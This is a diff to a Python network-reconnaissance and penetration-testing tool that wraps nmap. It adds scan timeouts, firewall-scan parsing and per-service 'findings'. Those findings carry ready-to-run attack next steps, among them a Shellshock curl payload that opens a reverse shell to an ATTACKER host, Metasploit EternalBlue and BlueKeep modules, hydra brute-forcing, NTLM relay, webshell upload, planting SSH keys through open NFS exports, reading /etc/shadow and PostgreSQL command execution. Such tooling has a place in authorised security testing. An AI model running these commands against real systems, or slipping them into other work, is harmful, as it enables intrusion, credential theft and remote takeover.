@@ -109,7 +109,7 @@ def parse_args():
         formatter_class=argparse.RawTextHelpFormatter,
         description=f"{C.BOLD}Katarina v3.0 — Penetration Testing Recon Tool by MTM{C.RESET}",
         epilog=f"""
-{C.BOLD}TARGET (-t / positional):{C.RESET}
+{C.BOLD}TARGET (positional):{C.RESET}
   192.168.1.1            Single IP
   192.168.1.1-20         Range (last octet 1 to 20)
   192.168.1.0/24         Full subnet
@@ -179,14 +179,53 @@ def resolve_ports(port_arg, scan_type):
 def timing_flag(timing):
     return {"stealth":"-T2","normal":"-T3","aggressive":"-T4"}[timing]
 
+def count_ports(port_flag, port_val):
+    """Estimate port count from resolve_ports output."""
+    if port_flag == "--top-ports":
+        return int(port_val)
+    if "-" in port_val:
+        parts = port_val.split("-")
+        return int(parts[1]) - int(parts[0]) + 1
+    if "," in port_val:
+        return len(port_val.split(","))
+    return 1
+
+def scan_timeout(port_count, includes_udp, timing):
+    """Calculate subprocess timeout ceiling for nmap scan."""
+    tcp_rate = {"stealth": 1.5, "normal": 0.5, "aggressive": 0.2}[timing]
+    udp_rate = {"stealth": 5.0, "normal": 3.0, "aggressive": 1.0}[timing]
+    secs = port_count * tcp_rate
+    if includes_udp:
+        secs += port_count * udp_rate
+    return max(300, int(secs))
+
+def estimate_scan_time(port_count, includes_udp, timing):
+    """Estimate typical scan duration (not worst-case) for user display."""
+    tcp_rate = {"stealth": 0.8, "normal": 0.3, "aggressive": 0.1}[timing]
+    udp_rate = {"stealth": 3.0, "normal": 1.5, "aggressive": 0.5}[timing]
+    secs = port_count * tcp_rate
+    if includes_udp:
+        secs += port_count * udp_rate
+    minutes = secs / 60
+    if minutes < 2:
+        return None
+    if minutes < 5:
+        return f"~{int(minutes)}-{int(minutes)+2} minutes"
+    return f"~{int(minutes)}-{int(minutes * 1.5)} minutes"
+
+_TIMEOUT_SENTINEL = "__TIMEOUT__"
+
 def run_cmd(cmd, verbose=False, timeout=300):
     if verbose: info(f"CMD: {' '.join(cmd)}")
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-        return r.stdout + r.stderr
+        if verbose and r.stderr:
+            for line in r.stderr.strip().splitlines()[:5]:
+                info(f"  stderr: {line}")
+        return r.stdout
     except subprocess.TimeoutExpired:
         warning("Command timed out")
-        return ""
+        return _TIMEOUT_SENTINEL
     except FileNotFoundError:
         error(f"Tool not found: {cmd[0]}")
         return ""
@@ -291,9 +330,12 @@ def phase_port_scan(target, ports_arg, scan_type, timing, verbose):
     port_flag, port_val, proto_mode, ports_desc = resolve_ports(ports_arg, scan_type)
     t_flag  = timing_flag(timing)
     results = {"tcp":[],"udp":[],"desc":ports_desc}
+    n_ports = count_ports(port_flag, port_val)
 
     def parse_nmap_xml(xml_out, proto_filter=None):
         found = []
+        if xml_out == _TIMEOUT_SENTINEL:
+            return found
         for b in re.finditer(r'<port protocol="(\w+)" portid="(\d+)">(.*?)</port>', xml_out, re.DOTALL):
             proto, portid, inner = b.groups()
             if proto_filter and proto != proto_filter: continue
@@ -304,59 +346,156 @@ def phase_port_scan(target, ports_arg, scan_type, timing, verbose):
                 found.append({"port":portid,"service":friendly_service(portid, raw_svc),"raw_service":raw_svc})
         return found
 
+    nmap_out = ""
+    timed_out = False
+
     if proto_mode is False:
+        includes_udp = True
+        t_out = scan_timeout(n_ports, True, timing)
+        est = estimate_scan_time(n_ports, True, timing)
         info(f"Mixed TCP+UDP — {ports_desc} [{timing}]")
+        if est: info(f"Estimated scan time: {est}")
         cmd = ["nmap","-sS","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target]
-        out = run_cmd(cmd, verbose)
-        results["tcp"] = parse_nmap_xml(out,"tcp")
-        results["udp"] = parse_nmap_xml(out,"udp")
+        nmap_out = run_cmd(cmd, verbose, timeout=t_out)
     elif proto_mode == "tcp-only" or scan_type == "tcp":
+        includes_udp = False
+        t_out = scan_timeout(n_ports, False, timing)
+        est = estimate_scan_time(n_ports, False, timing)
         info(f"TCP scan — {ports_desc} [{timing}]")
-        out = run_cmd(["nmap","-sS",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose)
-        results["tcp"] = parse_nmap_xml(out,"tcp")
+        if est: info(f"Estimated scan time: {est}")
+        nmap_out = run_cmd(["nmap","-sS",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=t_out)
     elif proto_mode == "udp-only" or scan_type == "udp":
+        includes_udp = True
+        t_out = scan_timeout(n_ports, True, timing)
+        est = estimate_scan_time(n_ports, True, timing)
         info(f"UDP scan — {ports_desc} [{timing}]")
-        out = run_cmd(["nmap","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=600)
-        results["udp"] = parse_nmap_xml(out,"udp")
+        if est: info(f"Estimated scan time: {est}")
+        nmap_out = run_cmd(["nmap","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=t_out)
     else:
-        for proto,flag in [("tcp","-sS"),("udp","-sU")]:
-            info(f"{proto.upper()} scan — {ports_desc} [{timing}]")
-            out = run_cmd(["nmap",flag,t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose)
-            results[proto] = parse_nmap_xml(out,proto)
+        includes_udp = True
+        info(f"Separate TCP + UDP — {ports_desc} [{timing}]")
+        est = estimate_scan_time(n_ports, True, timing)
+        if est: info(f"Estimated scan time: {est}")
+        tcp_tout = scan_timeout(n_ports, False, timing)
+        udp_tout = scan_timeout(n_ports, True, timing)
+        info(f"TCP scan ...")
+        tcp_out = run_cmd(["nmap","-sS",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=tcp_tout)
+        if tcp_out != _TIMEOUT_SENTINEL:
+            results["tcp"] = parse_nmap_xml(tcp_out,"tcp")
+        else:
+            timed_out = True
+        info(f"UDP scan ...")
+        udp_out = run_cmd(["nmap","-sU",t_flag,"--open",port_flag,port_val,"-oX","-",target], verbose, timeout=udp_tout)
+        if udp_out != _TIMEOUT_SENTINEL:
+            results["udp"] = parse_nmap_xml(udp_out,"udp")
+        else:
+            timed_out = True
+        nmap_out = (tcp_out or "") + (udp_out or "")
+
+    if nmap_out == _TIMEOUT_SENTINEL:
+        timed_out = True
+
+    if not timed_out:
+        results["tcp"] = results["tcp"] or parse_nmap_xml(nmap_out, "tcp")
+        results["udp"] = results["udp"] or parse_nmap_xml(nmap_out, "udp")
 
     for p in results["tcp"]: success(f"  TCP {p['port']:>5}/tcp   {p['service']}")
     for p in results["udp"]: success(f"  UDP {p['port']:>5}/udp   {p['service']}")
-    if not results["tcp"] and not results["udp"]: warning("No open ports found")
+    if not results["tcp"] and not results["udp"]:
+        if timed_out:
+            error(f"Scan timed out — {n_ports} ports {'(TCP+UDP)' if includes_udp else '(TCP)'} exceeded the time limit")
+            if includes_udp:
+                error("  UDP scanning is slow. Try: -s tcp (TCP only, much faster)")
+            error("  Or scan fewer ports: -p top100")
+            if timing != "aggressive":
+                error("  Or use aggressive timing: -t aggressive")
+        elif len(nmap_out) < 100 or "<port " not in nmap_out:
+            error("nmap produced no output — SYN and UDP scans require root/sudo")
+            error(f"  Try: sudo python3 katarina.py {target}")
+        else:
+            warning("No open ports found")
     return results
 
 # ─────────────────────────────────────────────
 #  PHASE 2 — FIREWALL ANALYSIS
 # ─────────────────────────────────────────────
+def _parse_port_states(xml_output):
+    """Extract per-port states from nmap XML, returning {state: [portids]}."""
+    by_state = {}
+    for m in re.finditer(r'<port protocol="\w+" portid="(\d+)">(.*?)</port>', xml_output, re.DOTALL):
+        portid, inner = m.groups()
+        sm = re.search(r'state="([^"]+)"', inner)
+        if sm:
+            by_state.setdefault(sm.group(1), []).append(portid)
+    return by_state
+
+def _has_root():
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return True
+    return os.geteuid() == 0
+
 def phase_firewall_analysis(target, ports_arg, scan_type, timing, verbose):
     section(f"PHASE 2 — Firewall Analysis [{target}]")
+    analysis = {"firewall_detected":False,"filtered_ports":[],"unfiltered_ports":[],
+                "window_open":[],"notes":[],"skipped":False}
+
+    if not _has_root():
+        warning("ACK and Window scans require root/sudo — skipping firewall analysis")
+        analysis["skipped"] = True
+        analysis["notes"].append("Skipped: requires root/sudo privileges")
+        return analysis
+
     _, port_val, _, _ = resolve_ports(ports_arg, scan_type)
     t_flag   = timing_flag(timing)
-    analysis = {"firewall_detected":False,"filtered_ports":[],"unfiltered_ports":[],"notes":[]}
     port_args = ["-p",port_val] if port_val not in ("1000","100") else ["--top-ports","100"]
 
     info("ACK scan ...")
     out = run_cmd(["nmap","-sA","-n",t_flag]+port_args+["-oX","-",target], verbose)
-    filtered = list(set(re.findall(r'portid="(\d+)"[^>]*>.*?state="filtered"', out, re.DOTALL)))
-    analysis["filtered_ports"] = filtered
-    if filtered:
-        analysis["firewall_detected"] = True
-        warning(f"Firewall DETECTED — {len(filtered)} filtered port(s)")
-        analysis["notes"].append(f"Stateful firewall filtering {len(filtered)} port(s)")
+    if out == _TIMEOUT_SENTINEL:
+        warning("ACK scan timed out — firewall results may be incomplete")
+        analysis["notes"].append("ACK scan timed out")
     else:
-        success("No stateful firewall detected")
+        ack_states = _parse_port_states(out)
+        analysis["filtered_ports"]   = ack_states.get("filtered", [])
+        analysis["unfiltered_ports"] = ack_states.get("unfiltered", [])
+        if analysis["filtered_ports"]:
+            analysis["firewall_detected"] = True
+            n = len(analysis["filtered_ports"])
+            warning(f"Firewall DETECTED — {n} filtered port(s)")
+            analysis["notes"].append(f"Stateful firewall filtering {n} port(s)")
+            if analysis["unfiltered_ports"]:
+                u = len(analysis["unfiltered_ports"])
+                info(f"  {u} port(s) unfiltered (not behind firewall)")
+        else:
+            success("No stateful firewall detected (all ports unfiltered)")
 
     info("Window scan ...")
     out2 = run_cmd(["nmap","-sW","-n",t_flag]+port_args+["-oX","-",target], verbose)
-    win_f = list(set(re.findall(r'portid="(\d+)"[^>]*>.*?state="filtered"', out2, re.DOTALL)))
-    if win_f:
-        analysis["notes"].append(f"Window scan confirms filtering: {', '.join(win_f[:10])}")
+    if out2 == _TIMEOUT_SENTINEL:
+        warning("Window scan timed out")
+        analysis["notes"].append("Window scan timed out")
+    else:
+        win_states = _parse_port_states(out2)
+        win_filtered = win_states.get("filtered", [])
+        win_open     = win_states.get("open", [])
+        win_closed   = win_states.get("closed", [])
+        if win_filtered:
+            if not analysis["firewall_detected"]:
+                analysis["firewall_detected"] = True
+                warning(f"Window scan detected filtering on {len(win_filtered)} port(s)")
+            analysis["notes"].append(f"Window scan: {len(win_filtered)} filtered port(s)")
+        if win_open:
+            analysis["window_open"] = win_open
+            success(f"  Window scan reveals {len(win_open)} open port(s) behind firewall: {', '.join(win_open[:10])}")
+            analysis["notes"].append(f"Window scan reveals open ports behind firewall: {', '.join(win_open[:10])}")
+        if win_closed:
+            info(f"  Window scan: {len(win_closed)} closed port(s)")
 
-    if not analysis["firewall_detected"]:
+    if not analysis["firewall_detected"] and not analysis["skipped"]:
         success("No significant filtering detected")
     return analysis
 
@@ -423,25 +562,61 @@ def phase_enumeration(target, services, verbose):
                            "-oN","-",target], verbose)
             anon = "ALLOWED" if "Anonymous FTP login allowed" in out else "DENIED"
             files = re.findall(r"\|\s+([-d].{8}\s+.+)", out)
-            enum_results[key] = {"service":"FTP","anonymous":anon,"files":files[:20],"raw":out[:1000]}
+            enum_results[key] = {"service":"FTP","anonymous":anon,"files":files[:20],"raw":out[:1000],"findings":[]}
             col = C.RED if anon == "ALLOWED" else C.GREEN
             print(f"  {col}FTP Anonymous login: {anon}{C.RESET}")
             if files:
                 warning(f"  FTP directory listing ({len(files)} entries):")
                 for f in files[:5]: info(f"    {f}")
 
+            if anon == "ALLOWED" and files:
+                enum_results[key]["findings"].append({
+                    "fact":f"Anonymous login allowed — {len(files)} files visible",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Download everything: wget -r ftp://anonymous:@{target}/",
+                        "Review files for credentials, configs, backups",
+                        "Check for writable directories — upload a webshell if web-accessible",
+                    ]})
+            elif anon == "ALLOWED":
+                enum_results[key]["findings"].append({
+                    "fact":"Anonymous login allowed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: ftp {target}",
+                        "Check for writable directories",
+                        "Try uploading a test file",
+                    ]})
+
         # ── SSH ──────────────────────────────────────────────
         elif service == "ssh" or port == "22":
             out = run_cmd(["nmap","-p",port,"--script",
                            "ssh-auth-methods,ssh2-enum-algos,ssh-hostkey",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"SSH","raw":out[:800]}
+            enum_results[key] = {"service":"SSH","raw":out[:800],"findings":[]}
             if "password" in out.lower():
                 warning(f"  SSH → Password auth ENABLED — brute-force possible")
             if "publickey" in out.lower():
                 info(f"  SSH → Public key auth available")
             if "none" in out.lower() and "Supported authentication" in out:
                 warning(f"  SSH → Auth: NONE — no password required!")
+
+            if "none" in out.lower() and "Supported authentication" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"No authentication required",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect directly: ssh {target}",
+                        "Check what user you land as, escalate from there",
+                    ]})
+            elif "password" in out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":"Password authentication enabled",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"Try common creds: ssh root@{target} (root:root, admin:admin)",
+                        f"Brute-force: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}",
+                    ]})
 
         # ── HTTP/HTTPS ───────────────────────────────────────
         elif service in ("http","https","http-alt","ssl/http") or port in ("80","443","8080","8443","8000","8888"):
@@ -456,29 +631,57 @@ def phase_enumeration(target, services, verbose):
             enum_results[key] = {"service":"HTTP",
                 "title":title.group(1).strip() if title else "N/A",
                 "server":server.group(1).strip() if server else "N/A",
-                "robots":robots,"raw":out[:1000]}
+                "robots":robots,"raw":out[:1000],"findings":[]}
             if title:  info(f"  HTTP → Title  : {title.group(1).strip()}")
             if server: info(f"  HTTP → Server : {server.group(1).strip()}")
             if robots: warning(f"  HTTP → {robots}")
             if "shellshock" in out.lower(): warning(f"  HTTP → Shellshock vulnerable!")
 
+            if "shellshock" in out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":"Shellshock vulnerability confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Exploit: curl -A '() {{ :; }}; /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' {scheme}://{target}:{port}/cgi-bin/STATUS_URI",
+                        f"Metasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec",
+                    ]})
+            if robots:
+                enum_results[key]["findings"].append({
+                    "fact":"robots.txt found — may reveal hidden paths",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"Read it: curl {scheme}://{target}:{port}/robots.txt",
+                        "Visit each disallowed path manually",
+                        f"Feed paths to gobuster or feroxbuster",
+                    ]})
+            title_str = title.group(1).strip() if title else ""
+            server_str = server.group(1).strip() if server else ""
+            desc_parts = [p for p in [server_str, title_str] if p and p != "N/A"]
+            desc = " — ".join(desc_parts) if desc_parts else "web server"
+            enum_results[key]["findings"].append({
+                "fact":f"Web server detected: {desc}",
+                "severity":"MEDIUM",
+                "next_steps":[
+                    f"Directory brute-force: gobuster dir -u {scheme}://{target}:{port} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt",
+                    f"Vuln scan: nikto -h {scheme}://{target}:{port}",
+                    "Check source code, login forms, file uploads for SQLi/XSS/LFI",
+                ]})
+
         # ── SMB / NetBIOS ────────────────────────────────────
         elif service in ("netbios-ssn","microsoft-ds","smb") or port in ("139","445"):
-            # Full SMB enumeration including null session
             info(f"  SMB null session attempt ...")
             smb_scripts = ("smb-os-discovery,smb-security-mode,smb2-security-mode,"
                            "smb-enum-shares,smb-enum-users,smb-enum-groups,"
                            "smb-vuln-ms17-010,smb-vuln-ms08-067")
             out = run_cmd(["nmap","-p",port,"--script",smb_scripts,"-oN","-",target], verbose, timeout=120)
 
-            # Parse shares
             shares = re.findall(r"\|\s+(\\\\[^\s]+|[A-Z$]+)\s+\|\s+(\w+)", out)
             users  = re.findall(r"user:\[([^\]]+)\]", out, re.IGNORECASE)
             null_session = "NULL session allowed" if ("account_used: <blank>" in out or
                            "account_used: guest" in out) else "NULL session unknown"
 
             enum_results[key] = {"service":"SMB","null_session":null_session,
-                                 "shares":shares,"users":users,"raw":out[:1500]}
+                                 "shares":shares,"users":users,"raw":out[:1500],"findings":[]}
 
             if "account_used: <blank>" in out or "account_used: guest" in out:
                 warning(f"  SMB → {null_session}")
@@ -494,7 +697,6 @@ def phase_enumeration(target, services, verbose):
             if "VULNERABLE" in out:
                 warning(f"  SMB → VULNERABILITY DETECTED (EternalBlue/MS08-067)!")
 
-            # Also try smbclient for null session
             smb_out = run_cmd(["smbclient","-L",f"//{target}","-N","--no-pass"], verbose, timeout=15)
             if smb_out and "Sharename" in smb_out:
                 warning(f"  SMB → smbclient NULL session: SUCCESS")
@@ -503,68 +705,198 @@ def phase_enumeration(target, services, verbose):
                     info(f"    Share: {s[0]} ({s[1]}) {s[2]}")
                 enum_results[key]["smbclient"] = smb_out[:800]
 
+            if "VULNERABLE" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"Known SMB vulnerability confirmed (EternalBlue/MS08-067)",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"EternalBlue: msfconsole → use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS {target}",
+                        f"MS08-067: msfconsole → use exploit/windows/smb/ms08_067_netapi → set RHOST {target}",
+                    ]})
+            if null_session == "NULL session allowed":
+                enum_results[key]["findings"].append({
+                    "fact":"Null session access confirmed",
+                    "severity":"HIGH",
+                    "next_steps":[
+                        f"Enumerate shares: smbmap -H {target}",
+                        f"Check for writable shares: smbmap -H {target} -R",
+                        "Look for sensitive files in readable shares",
+                    ]})
+            if "Message signing enabled but not required" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"SMB signing not required — relay attack possible",
+                    "severity":"HIGH",
+                    "next_steps":[
+                        "Capture hashes: responder -I eth0",
+                        f"Relay: ntlmrelayx.py -t {target} -smb2support",
+                    ]})
+            if users:
+                user_list = ', '.join(users[:10])
+                enum_results[key]["findings"].append({
+                    "fact":f"{len(users)} user(s) enumerated: {user_list}",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"Password spray these users: crackmapexec smb {target} -u users.txt -p passwords.txt",
+                        "Check for password reuse with any found credentials",
+                    ]})
+            if shares:
+                share_list = ', '.join(s[0] for s in shares[:5])
+                enum_results[key]["findings"].append({
+                    "fact":f"{len(shares)} share(s) found: {share_list}",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"Check permissions on each: smbmap -H {target}",
+                        f"Access readable shares: smbclient //{target}/SHARENAME -N",
+                    ]})
+
         # ── SMTP ─────────────────────────────────────────────
         elif service == "smtp" or port in ("25","465","587"):
             out = run_cmd(["nmap","-p",port,"--script",
                            "smtp-commands,smtp-open-relay,smtp-enum-users",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"SMTP","raw":out[:800]}
+            enum_results[key] = {"service":"SMTP","raw":out[:800],"findings":[]}
             if "VRFY" in out: warning(f"  SMTP → VRFY enabled — user enumeration possible")
             if "EXPN" in out: warning(f"  SMTP → EXPN enabled")
             if "open relay" in out.lower(): warning(f"  SMTP → OPEN RELAY detected!")
+
+            if "open relay" in out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":"Open relay confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Send test mail: swaks --to user@target --from attacker@fake.com --server {target}",
+                        "Use for phishing within engagement scope",
+                    ]})
+            if "VRFY" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"VRFY enabled — user enumeration possible",
+                    "severity":"HIGH",
+                    "next_steps":[
+                        f"Enumerate: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}",
+                        "Use found usernames for brute-force on other services (SSH, FTP)",
+                    ]})
+            if "EXPN" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"EXPN enabled — mailing list expansion",
+                    "severity":"HIGH",
+                    "next_steps":[
+                        f"Enumerate: smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}",
+                    ]})
 
         # ── DNS ──────────────────────────────────────────────
         elif service == "domain" or port == "53":
             out = run_cmd(["nmap","-p",port,"--script",
                            "dns-zone-transfer,dns-recursion,dns-cache-snoop,dns-nsid",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"DNS","raw":out[:1000]}
+            enum_results[key] = {"service":"DNS","raw":out[:1000],"findings":[]}
             if "Transfer failed" not in out and len(re.findall(r"dns-zone-transfer", out)) > 0:
                 warning(f"  DNS → Zone transfer possible!")
             bind_ver = re.search(r"bind.version:\s*(.+)", out)
             if bind_ver: info(f"  DNS → BIND version: {bind_ver.group(1).strip()}")
+
+            if "Transfer failed" not in out and len(re.findall(r"dns-zone-transfer", out)) > 0:
+                enum_results[key]["findings"].append({
+                    "fact":"Zone transfer allowed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Dump zone: dig axfr @{target} DOMAIN",
+                        "Review all hostnames for internal systems, dev boxes, admin panels",
+                    ]})
+            if bind_ver:
+                ver_str = bind_ver.group(1).strip()
+                enum_results[key]["findings"].append({
+                    "fact":f"BIND version disclosed: {ver_str}",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"Search for exploits: searchsploit BIND {ver_str}",
+                    ]})
 
         # ── SNMP ─────────────────────────────────────────────
         elif service == "snmp" or port == "161":
             out = run_cmd(["nmap","-p",port,"--script",
                            "snmp-info,snmp-sysdescr,snmp-processes,snmp-interfaces",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"SNMP","raw":out[:1000]}
+            enum_results[key] = {"service":"SNMP","raw":out[:1000],"findings":[]}
             if "public" in out.lower(): warning(f"  SNMP → Default community 'public' works!")
+
+            if "public" in out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":"Default community string 'public' accepted",
+                    "severity":"HIGH",
+                    "next_steps":[
+                        f"Dump everything: snmpwalk -c public -v1 {target}",
+                        "Extract users, processes, interfaces, routing tables",
+                        f"Try more community strings: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}",
+                    ]})
 
         # ── RDP ──────────────────────────────────────────────
         elif service in ("ms-wbt-server","rdp") or port == "3389":
             out = run_cmd(["nmap","-p",port,"--script",
                            "rdp-enum-encryption,rdp-vuln-ms12-020",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"RDP","raw":out[:800]}
+            enum_results[key] = {"service":"RDP","raw":out[:800],"findings":[]}
             if "VULNERABLE" in out: warning(f"  RDP → Vulnerability detected!")
+
+            if "VULNERABLE" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"RDP vulnerability confirmed (MS12-020 / BlueKeep)",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce → set RHOSTS {target}",
+                        f"Or: use auxiliary/dos/windows/rdp/ms12_020_maxchannelids → set RHOST {target}",
+                    ]})
 
         # ── MySQL ────────────────────────────────────────────
         elif service == "mysql" or port == "3306":
             out = run_cmd(["nmap","-p",port,"--script",
                            "mysql-info,mysql-empty-password,mysql-databases,mysql-users",
                            "-oN","-",target], verbose)
-            enum_results[key] = {"service":"MySQL","raw":out[:1000]}
+            enum_results[key] = {"service":"MySQL","raw":out[:1000],"findings":[]}
             if "empty password" in out.lower():
                 warning(f"  MySQL → Empty password on root!")
             dbs = re.findall(r"\|\s+(\w[\w_]+)\s*$", out, re.MULTILINE)
             if dbs: info(f"  MySQL → Databases: {', '.join(dbs[:10])}")
 
+            if "empty password" in out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":"Root login with empty password confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: mysql -h {target} -u root",
+                        "Dump databases: SHOW DATABASES; SELECT * FROM mysql.user;",
+                        "Check for file read/write: SELECT LOAD_FILE('/etc/passwd');",
+                    ]})
+            if dbs:
+                db_list = ', '.join(dbs[:10])
+                enum_results[key]["findings"].append({
+                    "fact":f"Databases enumerated: {db_list}",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        "Attempt access to each database for sensitive data",
+                    ]})
+
         # ── PostgreSQL ───────────────────────────────────────
         elif service == "postgresql" or port == "5432":
             out = run_cmd(["nmap","-p",port,"--script",
                            "pgsql-brute","-oN","-",target], verbose, timeout=30)
-            enum_results[key] = {"service":"PostgreSQL","raw":out[:800]}
+            enum_results[key] = {"service":"PostgreSQL","raw":out[:800],"findings":[]}
             if "Valid credentials" in out: warning(f"  PostgreSQL → Valid credentials found!")
+
+            if "Valid credentials" in out:
+                enum_results[key]["findings"].append({
+                    "fact":"Valid credentials confirmed",
+                    "severity":"CRITICAL",
+                    "next_steps":[
+                        f"Connect: psql -h {target} -U USERNAME",
+                        "List databases: \\l",
+                        "Try OS command execution: COPY cmd_exec FROM PROGRAM 'id';",
+                    ]})
 
         # ── RPC / portmapper ─────────────────────────────────
         elif service in ("rpcbind","portmapper") or port == "111":
-            # Use rpcinfo directly for proper structured output
             rpc_out = run_cmd(["rpcinfo","-p",target], verbose, timeout=15)
             nmap_out = run_cmd(["nmap","-p",port,"--script","rpcinfo,nfs-showmount",
                                 "-oN","-",target], verbose)
-            # Parse rpcinfo -p output (proper format: program vers proto port service)
             rpc_services = []
             for line in rpc_out.splitlines():
                 m = re.match(r"\s*(\d+)\s+(\d+)\s+(tcp|udp)\s+(\d+)\s+(\S+)", line)
@@ -573,21 +905,19 @@ def phase_enumeration(target, services, verbose):
                     rpc_services.append({"program":prog,"version":vers,
                                          "proto":proto2,"port":rport,"service":svc_name})
 
-            # Check NFS
             nfs_exports = []
             nfs_m = re.findall(r"nfs-showmount:\s*\n(?:\|.*\n)*", nmap_out)
             export_lines = re.findall(r"\|\s+(\/\S*)\s+(\S+)", nmap_out)
             if export_lines: nfs_exports = export_lines
 
             enum_results[key] = {"service":"RPC","rpc_services":rpc_services,
-                                 "nfs_exports":nfs_exports,"raw":rpc_out[:1000]}
+                                 "nfs_exports":nfs_exports,"raw":rpc_out[:1000],"findings":[]}
 
             if rpc_services:
                 info(f"  RPC → {len(rpc_services)} service(s) registered:")
                 for rs in rpc_services:
                     info(f"    {rs['port']:>6}/{rs['proto']}  prog:{rs['program']}  {rs['service']}")
             else:
-                # Fallback to nmap script output
                 info(f"  RPC → rpcinfo not available, using nmap script")
                 rpc_nmap = re.findall(r"(\d+)\s+(tcp|udp)\s+(nfs|mountd|nlockmgr|portmapper|status|rquotad)\b", nmap_out)
                 for r2 in rpc_nmap: info(f"    Port {r2[0]}/{r2[1]}  {r2[2]}")
@@ -598,11 +928,44 @@ def phase_enumeration(target, services, verbose):
             elif "100003" in rpc_out or "nfs" in rpc_out.lower():
                 warning(f"  NFS is running — run: showmount -e {target}")
 
+            for e in nfs_exports:
+                if e[1] == "*":
+                    enum_results[key]["findings"].append({
+                        "fact":f"NFS export world-readable: {e[0]}",
+                        "severity":"CRITICAL",
+                        "next_steps":[
+                            f"Mount: mount -t nfs {target}:{e[0]} /mnt/target",
+                            "Read sensitive files: /etc/shadow, SSH keys, config files",
+                            f"Write SSH key: cp id_rsa.pub /mnt/target/root/.ssh/authorized_keys",
+                        ]})
+                else:
+                    enum_results[key]["findings"].append({
+                        "fact":f"NFS export found: {e[0]} (access: {e[1]})",
+                        "severity":"HIGH",
+                        "next_steps":[
+                            "Check if your IP is in the allowed range",
+                            f"Try mounting: mount -t nfs {target}:{e[0]} /mnt/target",
+                        ]})
+            if not nfs_exports and ("100003" in rpc_out or "nfs" in rpc_out.lower()):
+                enum_results[key]["findings"].append({
+                    "fact":"NFS service running but exports not enumerated",
+                    "severity":"MEDIUM",
+                    "next_steps":[
+                        f"List manually: showmount -e {target}",
+                    ]})
+            if rpc_services and not nfs_exports and "100003" not in rpc_out and "nfs" not in rpc_out.lower():
+                enum_results[key]["findings"].append({
+                    "fact":f"{len(rpc_services)} RPC services registered",
+                    "severity":"LOW",
+                    "next_steps":[
+                        "Review registered services for known vulnerabilities",
+                    ]})
+
         # ── NFS ──────────────────────────────────────────────
         elif service == "nfs" or port == "2049":
             out = run_cmd(["showmount","-e",target], verbose, timeout=15)
             exports = re.findall(r"(/\S+)\s+(\S+)", out)
-            enum_results[key] = {"service":"NFS","exports":exports,"raw":out[:800]}
+            enum_results[key] = {"service":"NFS","exports":exports,"raw":out[:800],"findings":[]}
             if exports:
                 warning(f"  NFS → {len(exports)} export(s):")
                 for e in exports:
@@ -612,36 +975,143 @@ def phase_enumeration(target, services, verbose):
             else:
                 info(f"  NFS → No exports found or showmount failed")
 
+            for e in exports:
+                if e[1] == "*":
+                    enum_results[key]["findings"].append({
+                        "fact":f"World-readable NFS export: {e[0]}",
+                        "severity":"CRITICAL",
+                        "next_steps":[
+                            f"Mount: mount -t nfs {target}:{e[0]} /mnt/target",
+                            "Read sensitive files: /etc/shadow, SSH keys",
+                            f"UID spoof: useradd -u TARGET_UID attacker && su attacker",
+                        ]})
+                else:
+                    enum_results[key]["findings"].append({
+                        "fact":f"NFS export: {e[0]} (access: {e[1]})",
+                        "severity":"HIGH",
+                        "next_steps":[
+                            "Check if your IP is in the allowed range",
+                            f"Try mounting: mount -t nfs {target}:{e[0]} /mnt/target",
+                            "If mounted, look for sensitive files and SSH keys",
+                        ]})
+
         # ── Telnet ───────────────────────────────────────────
         elif service == "telnet" or port == "23":
